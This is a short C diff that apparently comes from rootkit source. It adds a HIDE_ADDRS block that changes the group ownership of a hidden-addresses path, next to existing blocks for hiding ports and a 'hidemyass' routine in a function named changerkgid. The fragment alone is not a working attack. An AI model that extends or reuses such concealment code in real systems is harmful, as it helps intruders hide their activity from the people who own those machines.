@@ -73,6 +73,9 @@ gid_t changerkgid(int curtime){
 #ifdef HIDE_PORTS
     chown_path(HIDEPORTS, newgid);
 #endif
+#ifdef HIDE_ADDRS
+    chown_path(HIDEADDRS, newgid);
+#endif
 #ifdef HIDE_MY_ASS
     hidemyass(oldgid);
 #endif
